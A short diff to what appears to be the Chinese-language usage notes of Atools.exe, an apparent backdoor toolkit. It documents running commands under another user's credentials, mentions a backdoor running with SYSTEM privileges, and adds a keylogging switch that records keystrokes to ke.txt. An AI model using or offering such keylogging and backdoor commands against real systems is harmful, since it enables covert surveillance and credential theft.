@@ -14,5 +14,7 @@ Atools.exe -e username password command > file.txt | 以其他用户权限运行
 (为什么会有这个，因为有时候我在system权限下运行的后门不知道为什么会无法执行一些系统命令
 各种方法都试过了都没用然后在tools看了个小程序可以就改了改加了进来)
 
+Atools.exe -k 键盘记录 -k -s 停止键盘记录(会在当前目录生成ke.txt)
+
 
 
